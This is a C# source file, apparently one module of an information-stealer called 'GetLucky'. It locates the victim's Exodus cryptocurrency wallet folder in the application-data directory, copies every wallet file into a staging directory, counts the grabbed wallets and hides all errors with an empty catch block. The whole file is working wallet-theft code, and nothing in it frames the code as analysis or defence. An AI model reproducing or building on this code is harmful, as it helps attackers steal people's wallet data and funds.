using System;
using System.IO;

namespace GetLucky
{
    class Exodus
    {
        public static int count = 0;
        public static string ExodusDir = "\\Wallets\\Exodus\\";
        public static string ExodusDir2 = Help.AppDate + "\\Exodus\\exodus.wallet\\";
        public static void ExodusStr(string directorypath) 
        {
            try
            {
                if (Directory.Exists(ExodusDir2))
                {
                    foreach (FileInfo file in new DirectoryInfo(ExodusDir2).GetFiles())

                    {
                        Directory.CreateDirectory(directorypath + ExodusDir);
                        file.CopyTo(directorypath + ExodusDir + file.Name);
                    }
                    count++;
                    Wallets.count++;
                }
                else
                {
                    return;
                }

            }
            catch {}

        }
    }
}
